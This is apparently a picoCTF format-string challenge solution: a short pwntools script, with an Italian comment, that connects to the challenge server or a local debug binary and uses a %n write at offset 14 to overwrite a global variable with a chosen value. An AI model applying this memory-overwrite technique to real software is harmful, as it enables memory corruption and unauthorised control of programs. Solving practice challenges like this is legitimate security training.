#obiettivo: sovrascriverela variabile sus, per scriverci sopra posso usare %n tuttavia sarà necessario calcolare quanti %n quindi l'offset (dove devo scrivere)

from pwn import *
context.arch = 'amd64'
#context.binary = elf = ELF('./vuln')
if args.REMOTE:
    conn = remote('rhea.picoctf.net', 51236)
else:
    conn = gdb.debug('/home/mattia/Documents/vuln', '''
       b *main
       c             
    ''')

sus_addr = 0x404060

target_value = 1734437990

response = conn.recvuntil('?')
print(response.decode())

payload = fmtstr_payload(14, {sus_addr: target_value})
print(len(payload))
conn.sendline(payload)
print(payload.decode())

conn.interactive()
